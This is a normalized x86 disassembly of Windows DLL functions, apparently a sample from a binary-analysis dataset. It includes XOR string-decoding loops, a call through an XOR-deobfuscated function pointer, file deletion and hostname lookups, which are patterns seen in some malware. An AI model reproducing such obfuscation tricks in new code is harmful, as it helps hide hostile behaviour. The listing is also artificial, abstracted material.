cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_10071840
push ebp
mov ebp esp
sub esp 0xc
push esi
push 0x18
mov esi ecx
call sub_1002e3ac
xor edx edx
add esp 0x4
cmp eax edx
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] edx
call sub_10032538
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_10055e2a
int3
mov ecx [ esi + 0x4 ]
mov [ eax ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ esi + 0x4 ]
mov [ eax + 0x8 ] ecx
lea ecx [ eax + 0xc ]
mov [ eax + 0x14 ] dx
cmp ecx edx
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
mov esi [ ebp + 0x8 ]
mov edx [ esi ]
mov [ ecx ] edx
mov dl [ esi + 0x4 ]
mov [ ecx + 0x4 ] dl
sub_100718ba
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_10051cf5
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_1001b8e5
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_10058423
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10071980
push ebp
mov ebp esp
push 0xffffffff
push sub_10087ad0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x3c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea esi [ ebp - 0x2c ]
mov edx ebx
call sub_10028370
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x0
call sub_10033f90
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_100449d0
test eax eax
jne r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
lea esi [ ebp - 0x2c ]
mov edx ebx
call sub_100502c0
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x1
call sub_10033f90
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_100449d0
test eax eax
jne r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea esi [ ebp - 0x2c ]
mov edx ebx
call sub_100262e0
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x2
call sub_10033f90
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
lea eax [ edi + 0x2 ]
jmp r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_100449d0
test eax eax
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1000a86e
add esp 0x4
lea esi [ ebp - 0x48 ]
mov edx ebx
call sub_10015940
push eax
mov ecx rw-data
mov [ ebp - 0x4 ] 0x3
call sub_10033f90
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
lea eax [ edi + 0x3 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x48 ]
push eax
call sub_1000a86e
add esp 0x4
sub_10071b00
push ebp
mov ebp esp
push ecx
xor eax eax
push 0xffffffff
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
push eax
add edx 0x24
mov [ esi ] cx
push edx
mov ecx esi
mov [ ebp - 0x4 ] eax
call sub_1002d970
mov eax esi
mov esp ebp
pop ebp
retn
sub_10071b72
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
jmp r-xdata
movzx edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
call [ eax + 0xc ]
mov eax [ ecx + 0x34 ]
dec [ eax ]
mov eax [ ecx + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
mov al [ ebp + 0x8 ]
mov [ ecx ] al
movzx eax al
jmp r-xdata
test eax eax
jle r-xdata
pop ebp
retn 0x4
sub_10071bf0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086940
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0x7ffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov ebx eax
jmp r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov esi 0x7ffffffe
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
lea edx [ ebp - 0x18 ]
push edx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x18 ] 0x0
call sub_10032538
push r--data
lea eax [ ebp - 0x24 ]
push eax
mov [ ebp - 0x24 ] r--data
call sub_10055e2a
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp + 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_1004a5e0
mov [ ebp - 0x18 ] eax
mov eax r-xdata
retn
add ecx ecx
push ecx
call sub_1002e3ac
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi ] ebx
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ecx
cmp esi 0x8
jb r-xdata
mov edx [ edi ]
push edx
call sub_1000a86e
mov ecx [ ebp + 0xc ]
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
xor edx edx
mov [ edi + ecx * 2 ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi ebx
add ecx ecx
push ecx
push eax
push ebx
call sub_1007f580
mov ecx [ ebp + 0xc ]
add esp 0xc
sub_10071d36
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push ecx
mov [ esi ] cx
call sub_10055e2a
int3
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
sub_10071d90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
jne r-xdata
pop ebp
retn
mov edi edi
mov eax ecx
mov ecx [ eax ]
cmp [ ecx + 0x15 ] 0x0
je r-xdata
sub_10071db0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
cmp [ esi + 0x15 ] 0x0
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
pop esi
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
mov [ ecx + 0x8 ] eax
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebp
retn 0x4
sub_10071e07
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
test eax eax
je r-xdata
pop ebp
retn
push eax
push 0x0
call sub_1003a9f6
pop ecx
pop ecx
sub_10071e30
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10071e80
push esi
lea esi [ ebx - 0x1 ]
test esi esi
js r-xdata
xor edx edx
mov [ edi + ebx * 2 ] dx
pop esi
retn
jmp r-xdata
mov eax 0xcccccccd
mul ecx
shr edx 0x3
lea eax [ edx + edx * 4 ]
add eax eax
sub ecx eax
add ecx 0x30
dec esi
mov [ edi + esi * 2 + 0x2 ] cx
mov ecx edx
jns r-xdata
xor ecx ecx
mov [ edi + ebx * 2 ] cx
pop esi
retn
sub_10071ec0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
add ecx [ ebp + 0x8 ]
push eax
movsx eax [ ebp + 0x10 ]
push eax
push ecx
call sub_1007f8f0
add esp 0xc
pop ebp
retn 0xc
mov ecx [ ecx ]
mov al [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx ] al
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_10071f00
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_10053ef5
mov esi eax
add esp 0x4
test esi esi
je r-xdata
pop esi
pop ebp
retn 0x8
call sub_1005b670
mov ecx [ eax ]
mov edx [ ebp + 0xc ]
mov [ edx ] ecx
mov eax esi
sub_10071f30
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10071f80
push ebp
mov ebp esp
sub esp 0x230
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
lea eax [ ebp - 0x230 ]
push eax
push 0x2
mov ebx ecx
call [ WSAStartup@IAT ]
test eax eax
je r-xdata
push 0x80
lea ecx [ ebp - 0xa0 ]
push ecx
call [ gethostname@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xa0 ]
push edx
call [ gethostbyname@IAT ]
mov esi eax
test esi esi
jne r-xdata
call [ WSACleanup@IAT ]
mov eax 0x2
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x1c ]
xor eax eax
call sub_10019570
mov eax [ esi + 0xc ]
mov eax [ eax ]
movzx ecx [ eax + 0x3 ]
movzx edx [ eax + 0x2 ]
push ecx
movzx ecx [ eax + 0x1 ]
push edx
movzx edx [ eax ]
push ecx
push edx
lea eax [ ebp - 0x1c ]
push eax
mov ecx 0x10
call sub_1006d3c0
add esp 0x14
call [ WSACleanup@IAT ]
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
call [ WSACleanup@IAT ]
lea eax [ esi + 0x3 ]
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10072070
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
nop
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
add esp 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
sub_100720b0
push ebp
mov ebp esp
sub esp 0x58
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
inc eax
cmp eax 0x28
jb r-xdata
mov eax [ esi + 0x20 ]
push eax
call [ ReleaseMutex@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x86
call sub_1002f620
mov ecx [ esi + 0x20 ]
push ecx
call [ CloseHandle@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov [ esi + 0x20 ] 0x0
xor eax eax
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x40 ]
mov eax 0x11e
call sub_1002f620
mov eax 0x1
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10072130
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_10072180
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax [ edi ]
mov edx [ eax + 0x8 ]
push ebx
call edx
cmp [ edi + 0x8 ] 0x0
je r-xdata
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
mov ebx [ DeleteFileW@IAT ]
mov eax [ edi ]
mov edx [ eax ]
mov ecx edi
call edx
cmp [ edi + 0x84 ] 0x8
lea eax [ edi + 0x70 ]
jb r-xdata
push esi
mov esi [ edi + 0xb4 ]
cmp esi [ edi + 0xb8 ]
je r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] ecx
mov cl 0x38
xor [ ebp - 0x4 ] cl
xor [ ebp - 0x3 ] cl
xor [ ebp - 0x2 ] cl
xor [ ebp - 0x1 ] cl
push eax
call [ ebp - 0x4 ]
mov [ edi + 0xb0 ] 0x0
mov ebx [ DeleteFileW@IAT ]
push eax
call ebx
jmp r-xdata
mov eax [ eax ]
mov eax [ edi + 0xb4 ]
mov ecx [ edi + 0xb8 ]
cmp eax ecx
je r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
add edi 0x94
cmp [ edi + 0x14 ] 0x8
pop esi
jb r-xdata
mov edx [ ebp - 0x4 ]
push edx
push ecx
call sub_1006cad0
mov ebx [ edi + 0xb8 ]
add esp 0x8
mov [ ebp - 0x4 ] eax
mov esi eax
cmp eax ebx
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push edi
call ebx
pop ebx
pop edi
mov esp ebp
pop ebp
retn
mov edi [ edi ]
mov ebx [ DeleteFileW@IAT ]
mov [ edi + 0xb8 ] eax
lea ecx [ ecx ]
push eax
call ebx
add esi 0x1c
cmp esi [ edi + 0xb8 ]
jne r-xdata
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi ebx
jne r-xdata
mov eax [ esi ]
push eax
call sub_1000a86e
mov eax [ ebp - 0x4 ]
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_100722a2
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10004d16
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1007233f
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_10051cf5
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_1005b670
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_1005b670
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_1004b131
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_1003f3ab
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_10083820
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10083930
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10083930
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_1007f8f0
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_10083930
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_10083850
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_10083850
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_10083850
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_100726c0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor eax eax
push edi
test esi esi
je r-xdata
pop edi
pop esi
mov eax 0x8007007a
mov [ ecx - 0x1 ] 0x0
pop ebx
pop ebp
retn 0x4
mov ebx [ ebp + 0x8 ]
mov edi edx
sub ebx ecx
test esi esi
jne r-xdata
mov dl [ ebx + ecx ]
test dl dl
je r-xdata
pop edi
pop esi
mov [ ecx ] al
pop ebx
pop ebp
retn 0x4
mov [ ecx ] dl
inc ecx
dec edi
dec esi
jne r-xdata
test edi edi
je r-xdata
pop edi
pop esi
mov eax 0x8007007a
mov [ ecx - 0x1 ] 0x0
pop ebx
pop ebp
retn 0x4
sub_10072720
xor eax eax
test edx edx
je r-xdata
mov eax 0x80070057
cmp edx 0x7fffffff
jbe r-xdata
mov [ edi ] 0x0
retn
xor eax eax
push esi
mov esi edx
test edx edx
je r-xdata
test eax eax
js r-xdata
mov eax 0x80070057
cmp [ ecx ] ax
je r-xdata
pop esi
retn
test eax eax
js r-xdata
test esi esi
jne r-xdata
add ecx 0x2
dec esi
jne r-xdata
mov [ edi ] 0x0
sub edx esi
mov [ edi ] edx
pop esi
retn
test edi edi
je r-xdata
jmp r-xdata
sub_10072780
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
xor eax eax
push edi
test esi esi
je r-xdata
sub ecx 0x2
mov eax 0x8007007a
mov ebx [ ebp + 0x8 ]
mov edi edx
sub ebx ecx
test esi esi
jne r-xdata
movzx edx [ ebx + ecx ]
test dx dx
je r-xdata
pop edi
xor edx edx
pop esi
mov [ ecx ] dx
pop ebx
pop ebp
retn 0x4
mov [ ecx ] dx
add ecx 0x2
dec edi
dec esi
jne r-xdata
test edi edi
je r-xdata
pop edi
sub ecx 0x2
xor edx edx
pop esi
mov eax 0x8007007a
mov [ ecx ] dx
pop ebx
pop ebp
retn 0x4
sub_100727f0
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
push 0x0
push ecx
push edx
push eax
call sub_1006f2cf
add esp 0x14
pop ebp
retn
sub_10072810
mov ecx 0x9
xor eax eax
test ecx ecx
jne r-xdata
add edx 0x2
dec ecx
jne r-xdata
test esi esi
je r-xdata
mov eax 0x80070057
cmp [ edx ] ax
je r-xdata
jmp r-xdata
retn
test eax eax
js r-xdata
mov [ esi ] 0x0
mov edx 0x9
sub edx ecx
mov [ esi ] edx
retn
sub_10072850
push ebp
mov ebp esp
push 0xffffffff
push sub_10084c80
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4c ] ebx
mov eax [ edi ]
cmp eax 0x2
jne r-xdata
cmp eax 0x1
jne r-xdata
mov edi [ edi + 0x10 ]
mov eax edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
lea edx [ eax + 0x1 ]
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
push r--data
mov eax [ edi + 0x1c ]
cmp eax 0x7
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
